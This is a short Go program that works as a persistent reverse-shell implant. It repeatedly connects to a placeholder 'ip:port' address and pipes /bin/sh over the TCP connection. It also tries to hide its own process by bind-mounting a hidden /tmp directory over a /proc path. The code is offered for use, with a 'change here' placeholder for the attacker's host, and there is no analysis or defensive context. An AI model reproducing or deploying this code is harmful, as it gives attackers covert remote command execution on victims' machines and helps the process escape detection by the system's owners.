package main

import (
	"math/rand"
	"os"
	"os/exec"
)
import "net"
import "time"
import "fmt"

func MakeConnect() {
	time.Sleep(30 * time.Second)
	host := "ip:port" // change here
	con, _ := net.Dial("tcp", host)
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	//fmt.Println("start rev...")
	cmd.Run()
}

func randSeq(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	token := randSeq(5)

	//dir := fmt.Sprintf("mkdir /tmp/%s && mount -o bind /tmp/%s /proc/%d", token, token, os.Getpid())
	cmd := exec.Command("mkdir", fmt.Sprintf("/tmp/.%s", token))
	cmd.Run()
	cmd2 := exec.Command("mount", "-o", "bind", fmt.Sprintf("/tmp/.%s", token), fmt.Sprintf("/proc/.%d", os.Getpid()))
	cmd2.Run()

	for true {
		MakeConnect()
	}
}
